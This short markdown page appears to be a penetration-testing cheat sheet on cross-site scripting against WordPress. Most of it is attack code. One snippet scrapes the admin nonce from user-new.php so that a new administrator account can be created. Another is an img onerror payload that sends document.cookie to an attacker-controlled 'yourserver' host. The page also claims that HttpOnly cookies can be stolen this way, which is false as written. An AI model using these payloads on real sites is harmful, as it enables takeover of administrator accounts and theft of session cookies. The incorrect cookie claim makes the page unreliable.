---
layout: blank
pagetitle: XSS
---

**XSS Exploitation Example**
- Grabbing a nonce value from /wp-admin/user-new.php
	- var ajaxRequest = new XMLHttpRequest(); 
	- var requestURL = "/wp-admin/user-new.php"; 
	- var nonceRegex = /ser" value="(\[^"]\*?)"/g; 
	- ajaxRequest.open("GET", requestURL, false); 
	- ajaxRequest.send(); 
	- var nonceMatch = nonceRegex.exec(ajaxRequest.responseText); 
	- var nonce = nonceMatch\[1];
- Then, use that `nonce` variable with /wp-admin/user-new.php to create a new administrator


Cookies with HttpOnly can be stolen with XSS
- `<img src=x onerror=this.src='http://yourserver/?c='+document.cookie>`